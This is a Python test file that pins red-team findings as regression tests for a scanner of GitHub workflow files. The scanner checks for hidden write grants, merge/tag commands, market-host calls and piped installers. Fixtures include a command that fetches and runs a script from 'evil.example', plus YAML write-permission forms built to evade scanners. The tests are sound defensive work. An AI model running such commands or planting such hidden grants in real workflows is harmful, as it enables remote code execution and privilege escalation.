"""Reproduced M3F red-team findings (failing-test-first).

Three independent auditors reviewed the M3F layer; the genuine defects they
reproduced are pinned here as regression tests. Each was written to fail against
the pre-fix code and pass once the fix landed. See docs/M3F_FINDINGS.md for the
narrative and severities.

Theme 1 — workflow write/verb/installer/host detection (A1, A2, B1, B2, B3, B6, C3).
"""

from __future__ import annotations

import importlib.util
import shutil
from pathlib import Path

import pytest

import eth_research
from eth_research.m3f.honest_state import _any_workflow_writes, derive_honest_state
from eth_research.m3f.validation import M3FValidationError
from eth_research.m3f.workflow_inventory import _scan_one, workflow_grants_write

REPO_ROOT = Path(eth_research.__file__).resolve().parents[2]

_INDEPENDENT_TOOL = REPO_ROOT / "tools/m3f_independent_verify.py"


def _independent_module() -> object:
    spec = importlib.util.spec_from_file_location("m3f_iv", _INDEPENDENT_TOOL)
    assert spec is not None
    assert spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# The write grants that evaded the pre-fix substring/regex scanners.
_WRITE_FORMS = [
    ("single_space", "permissions:\n  contents: write\n"),
    ("trailing_comment", "permissions:\n  contents: write  # keep for release\n"),
    ("multi_space_comment", "permissions:\n  contents:   write  # c\n"),
    ("tab_comment", "permissions:\n  contents:\twrite\t# c\n"),
    ("yaml_anchor", "permissions:\n  contents: &w write\n"),
    ("flow_map", "permissions: { contents: write }\n"),
    ("write_all", "permissions: write-all\n"),
]


@pytest.mark.parametrize(("name", "text"), _WRITE_FORMS, ids=[f[0] for f in _WRITE_FORMS])
def test_write_grant_detected_by_package_and_independent(name: str, text: str) -> None:
    assert workflow_grants_write(text) is True
    assert _independent_module()._workflow_grants_write(text) is True  # type: ignore[attr-defined]


def test_read_only_permission_not_flagged() -> None:
    text = "permissions:\n  contents: read\n"
    assert workflow_grants_write(text) is False
    assert _independent_module()._workflow_grants_write(text) is False  # type: ignore[attr-defined]


def _scan_run(tmp_path: Path, command: str) -> dict[str, object]:
    body = f"jobs:\n  a:\n    steps:\n      - run: {command}\n"
    path = tmp_path / "w.yml"
    path.write_text("name: x\npermissions:\n  contents: read\n" + body, encoding="utf-8")
    return _scan_one(path)


_MERGE_TAG_COMMANDS = [
    ("rest_create_tag_ref", "gh api -X POST repos/o/r/git/refs"),
    ("rest_move_branch", "gh api -X PATCH repos/o/r/git/refs/heads/main"),
    ("automerge_graphql", "gh api graphql -f q=enablePullRequestAutoMerge"),
    ("automerge_action_verb", "enable-pull-request-automerge"),
    ("gh_pr_merge_auto", "gh pr merge --auto 5"),
]


@pytest.mark.parametrize(
    ("name", "command"), _MERGE_TAG_COMMANDS, ids=[v[0] for v in _MERGE_TAG_COMMANDS]
)
def test_ref_mutation_and_automerge_verbs_flagged(tmp_path: Path, name: str, command: str) -> None:
    assert _scan_run(tmp_path, command)["can_merge_or_release_or_tag"] is True


def test_process_substitution_installer_flagged(tmp_path: Path) -> None:
    assert _scan_run(tmp_path, "bash <(curl -fsSL https://evil.example/x.sh)")["piped_installer"]


@pytest.mark.parametrize("host", ["api.binance.com", "api.kraken.com", "api.coingecko.com"])
def test_broadened_market_hosts_flagged(tmp_path: Path, host: str) -> None:
    assert _scan_run(tmp_path, f"curl https://{host}/v1/x")["contacts_market_host"] is True


# --------------------------------------------------------------------------- #
# end-to-end: the forever-invariant catches a hidden write grant              #
# --------------------------------------------------------------------------- #
def _governance_repo(tmp_path: Path) -> Path:
    for sub in ("research/m3c", "research/m3e", "research/m2b", "research/m3a", "research/m3d"):
        (tmp_path / sub).mkdir(parents=True)
    shutil.copyfile(
        REPO_ROOT / "research/m3c/candidate_decision.json",
        tmp_path / "research/m3c/candidate_decision.json",
    )
    shutil.copyfile(
        REPO_ROOT / "research/m3e/accepted_base.json",
        tmp_path / "research/m3e/accepted_base.json",
    )
    shutil.copyfile(
        REPO_ROOT / "research/m3e/proposal_registry.jsonl",
        tmp_path / "research/m3e/proposal_registry.jsonl",
    )
    for empty in (
        "research/m2b/test_evaluations.jsonl",
        "research/m3a/development_gate_access.jsonl",
        "research/m3d/prospective_evaluations.jsonl",
    ):
        (tmp_path / empty).write_bytes(b"")
    return tmp_path


def test_hidden_write_workflow_trips_forever_invariant(tmp_path: Path) -> None:
    root = _governance_repo(tmp_path)
    wf = root / ".github/workflows"
    wf.mkdir(parents=True)
    # a write grant hidden behind extra spaces + a trailing comment
    (wf / "sneaky.yml").write_text(
        "name: sneaky\npermissions:\n  contents:   write  # retained for release\n",
        encoding="utf-8",
    )
    assert _any_workflow_writes(root) is True
    with pytest.raises(M3FValidationError, match="workflow can write"):
        derive_honest_state(root)


def test_evaluation_authorized_non_bool_fails_closed(tmp_path: Path) -> None:
    # C4: a falsy non-bool (int 0) must be rejected, not silently coerced to False.
    root = _governance_repo(tmp_path)
    base_path = root / "research/m3e/accepted_base.json"
    text = base_path.read_text(encoding="utf-8")
    tampered = text.replace('"evaluation_authorized": false', '"evaluation_authorized": 0')
    assert tampered != text
    base_path.write_text(tampered, encoding="utf-8")
    with pytest.raises(M3FValidationError):
        derive_honest_state(root)
